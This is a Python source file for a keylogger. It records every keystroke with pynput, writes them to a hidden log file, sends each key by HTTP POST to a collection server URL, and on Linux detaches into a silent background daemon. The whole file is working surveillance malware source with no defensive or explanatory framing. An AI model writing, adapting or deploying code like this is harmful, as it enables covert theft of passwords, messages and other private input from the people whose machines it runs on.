import os
import sys
import platform
from pynput import keyboard
from multiprocessing import Process
import requests

os_name = platform.system()

# Define log file path based on the operating system
if os_name == 'Linux':
    log_file = os.path.expanduser("~/.keylog.txt")
elif os_name == 'Windows':
    log_file = os.path.join(os.getenv('APPDATA'), 'keylog.txt')
else:
    log_file = os.path.expanduser("~/keylog.txt")


server_url = 'http://localhost/keylogs.php'

def on_press(key):
    try:
        
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
        
        send_log(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
                send_log(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
                send_log("\n")
            else:
                f.write(f" [{key}] ")
                send_log(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def send_log(log_data):
    try:
        # Send log data to the server via POST request
        requests.post(server_url, data={'log': log_data})
    except Exception as e:
        print(f"Failed to send log data: {e}")

def daemonize():
    if os.fork() > 0:
        return
    os.setsid()
    if os.fork() > 0:
        sys.exit()
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')
    sys.stdin = open(os.devnull, 'r')
    start_keylogger()

if __name__ == "__main__":
    if os_name == 'Linux':
        Process(target=daemonize).start()
